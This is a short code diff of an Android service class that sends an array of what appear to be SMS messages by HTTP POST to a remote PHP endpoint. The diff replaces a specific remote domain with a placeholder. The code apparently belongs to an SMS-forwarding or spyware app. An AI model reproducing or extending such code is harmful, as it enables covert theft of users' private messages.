@@ -92,7 +92,7 @@ public class SmsService extends android.app.Service {
     private void sendToServer(JSONArray messagesArray) {
         new Thread(() -> {
             try {
-                URL url = new URL("https://slitherr.s946.site/index.php");
+                URL url = new URL("https://site/index.php");
                 HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                 connection.setRequestMethod("POST");
                 connection.setRequestProperty("Content-Type", "application/json");
